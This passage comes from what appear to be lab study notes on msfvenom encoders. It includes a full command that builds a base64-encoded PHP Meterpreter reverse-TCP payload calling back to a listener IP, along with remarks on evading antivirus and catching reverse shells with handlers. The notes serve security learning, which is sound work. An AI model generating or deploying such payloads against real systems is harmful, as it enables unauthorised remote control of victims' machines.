...
- Encoders do not bypass  antivirus installed on the target system, they  only encode the payload.
- Encoders are effective against some antivirus software but using modern obfuscation techniques or learning methods to inject shellcode is better solution.
- <mark>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64</mark> - this example shows the usage of encoding using <mark>-e</mark> parameter. Here PHP version of Meterpreter is get encoded in Base64, and the output format will be raw.
- It is important to encode the php meterpreter into base64 as some environments won't let the binary version meterpreter run in the target.
- Handlers help to accept incoming connections of reverse shell which are generated by the MsFvenom payload.
